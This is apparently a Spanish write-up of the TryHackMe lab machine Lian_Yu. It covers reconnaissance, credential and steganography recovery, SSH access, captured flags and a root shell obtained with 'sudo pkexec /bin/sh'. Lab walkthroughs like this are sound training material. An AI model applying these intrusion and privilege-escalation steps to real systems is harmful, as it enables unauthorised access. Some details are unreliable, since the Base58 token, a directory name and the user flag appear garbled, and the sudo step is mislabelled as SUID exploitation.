## 🏝️ Lian\_Yu (TryHackMe) - Write-up

Este repositorio contiene la documentación completa y detallada (write-up) del desafío de ciberseguridad **Lian\_Yu** de TryHackMe.

La máquina, de dificultad fácil, está fuertemente tematizada en la serie *Arrow* de DC Comics (Oliver Queen, Slade Wilson/Deathstroke), y pone a prueba habilidades fundamentales de un pentester.

**Metodología y Técnicas Demostradas:**

* **Enumeración:** Nmap, Gobuster, CeWL.
* **Acceso Inicial:** Descubrimiento y decodificación de tokens (**Base58**) y credenciales.
* **Análisis Forense:** Extracción de datos ocultos mediante **Esteganografía (StegSeek)** en archivos de imagen.
* **Pivotaje:** Obtención de credenciales de un segundo usuario.
* **Escalada de Privilegios:** Identificación y explotación de binarios **SUID (`pkexec`)** utilizando recursos como **GTFOBins**.

---
**¡Misión cumplida: Acceso total como Root!**

🛡️ Lian_Yu (TryHackMe) - Write-upℹ️ Información de la MáquinaDetalleValorPlataformaTryHackMeMáquinaLian_YuDificultadFácilTemáticaCiberseguridad/DC Comics (Green Arrow/Deathstroke)IP del Objetivo10.10.46.117Fecha de Completado[2025-11-05]0️⃣ Reconocimiento Inicial: NmapSe inicia el proceso de reconocimiento con Nmap para identificar los puertos abiertos y los servicios en ejecución.Bashnmap -sC -sV 10.10.46.117
PuertoEstadoServicioVersión21openftpvsftpd 3.0.222opensshOpenSSH 7.2p280openhttpApache httpd 2.4.18Conclusión: Los puertos abiertos sugieren que los principales vectores de ataque serán la aplicación web (80), el acceso de shell (22) y el servidor de transferencia de archivos (21).1️⃣ Fase de Enumeración Web (HTTP/80)Se inicia la enumeración del servidor web.1.1. Pista Inicial: /island/Se encontró el directorio /island/ y un mensaje web que ofrecía la primera pista:URLMensajePistahttp://10.10.46.117/island/"The Code Word is: vigilante"Usuario potencial: vigilante1.2. Descubrimiento y Decodificación de CredencialesSe continuó la enumeración en /island/ y se encontró el archivo .ticket, revelando un token codificado:Bash# Se encontró el directorio /island/2100m/
gobuster dir -u http://10.10.46.117/island/ -w [wordlist]...
# Se encontró el archivo /green_arrow.ticket
gobuster dir -u http://10.10.46.117/island/2100/ -x .ticket
El contenido de /green_arrow.ticket era el token Base58: RTy8yhB0dscX.Cifrado/EncodingTokenDecodificadoBase58RTy8yhB0dscX!#th3h00dCredenciales Parciales:vigilante:!#th3h00d2️⃣ Acceso de Usuario (FTP y SSH)Se utilizó la primera credencial para acceder al servicio FTP (puerto 21).2.1. Enumeración de FTPEl acceso a ftp vigilante@10.10.46.117 fue exitoso. Al listar el directorio (ls -la), se encontraron archivos importantes:ArchivoContenido/Propósito.other_userBiografía de Slade Wilson. (Nuevo usuario potencial: slade)aa.jpgImagen (vector de esteganografía).2.2. Esteganografía y Credencial de sladeSe descargaron los archivos y se enfocó el análisis en aa.jpg.Técnica: Se utilizó stegseek (fuerza bruta de esteganografía) para encontrar el archivo oculto.Bash# Se usó StegSeek y se encontró la contraseña: "password"
stegseek aa.jpg
# Se descomprimió el archivo oculto (aa.jpg.out)
unzip aa.jpg.out
La descompresión reveló el archivo shado, que contenía la contraseña del nuevo usuario:UsuarioContraseñasladeM3tahuman2.3. Acceso SSH y Captura de user.txtSe utilizó el nuevo par de credenciales para acceder vía SSH (puerto 22).Bash# Acceso exitoso a la máquina
ssh slade@10.10.46.117
ComandoResultadocat user.txtTHM{P3O P7E_K33P_53CR3T5_C0MPUT3R5_D0N'T}3️⃣ Escalada de Privilegios (Root)Se inició la enumeración del sistema buscando binarios SUID.3.1. Detección de Binario SUIDSe utilizó el comando find para listar los binarios SUID disponibles:Bashfind / -perm -u=s -type f 2>/dev/null
Se identificó el binario /usr/bin/pkexec como el vector de ataque principal.3.2. Explotación SUID con GTFOBinsSe utilizó la web GTFOBins para confirmar y explotar el binario SUID pkexec.HerramientaBinarioVectorGTFOBinspkexecSUID (Shell)Se utilizó el siguiente comando para ejecutar una shell con permisos de root (indicado por el prompt #):Bash# Se ingresa la contraseña de 'slade'
sudo pkexec /bin/sh
3.3. Captura de root.txtCon la shell de root, se capturó el flag final.Bashcd /root
cat root.txt
Flag de RootContenidoroot.txtTHM{MY_WORD_IS_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_C0MPL3T3D_OR_I'LL_BE_D34D}
